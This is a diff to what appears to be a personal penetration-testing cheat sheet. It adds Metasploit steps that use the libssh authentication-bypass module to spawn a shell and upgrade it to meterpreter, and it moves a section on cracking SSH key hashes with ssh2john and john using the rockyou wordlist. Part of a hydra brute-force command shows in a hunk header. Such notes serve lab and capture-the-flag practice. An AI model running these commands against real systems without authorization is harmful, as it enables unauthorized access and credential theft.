@@ -8,6 +8,7 @@
 	2. [nmap](#nmap)
 	3. [hydra](#hydra)
 	4. [msfconsole](#msfconsole)
+	5. ssh2john
 
 ---
 
@@ -72,12 +73,20 @@ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt \
 	- set verbose true
 	- run
 
-##ssh2john
-1. `ssh2john > hash`
-2. `john -w wordlist/rockyou.txt hash`
-
----
+### Example
+1. `search libssh` : service "protocol 2.0"  module
+2. `use auxiliary/scanner/ssh/libssh_auth_bypass`
+	1. `set rhosts` : set target
+	2. `set SPAWN_PTY true` : set flag to spawn session
+	3. ctrl-z : background session
+3. `sessions -u 1` : upgrade to meterpreter
 
 ### Userful Modules
 - auxiliary/scanner/ssh/ssh_version
 - auxiliary/scanner/ssh/ssh_login
+
+---
+
+## ssh2john
+1. `ssh2john > hash`
+2. `john -w wordlist/rockyou.txt hash`
